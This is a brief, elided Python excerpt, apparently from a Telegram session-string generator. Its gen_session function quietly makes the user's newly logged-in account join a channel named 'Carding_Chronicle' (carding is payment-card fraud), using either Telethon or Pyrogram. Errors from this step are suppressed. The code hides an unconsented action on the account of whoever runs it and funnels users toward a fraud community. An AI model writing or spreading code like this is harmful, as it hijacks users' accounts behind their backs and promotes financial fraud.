...
from KanishkaString import Anony
from KanishkaString.utils import retry_key
...
async def gen_session(
    ...
    try:
        ...
        if telethon:
            ...
            await client(JoinChannelRequest("@Carding_Chronicle"))
        else:
            ...
            await client.join_chat("Carding_Chronicle")
    except KeyError:
        pass
    try:
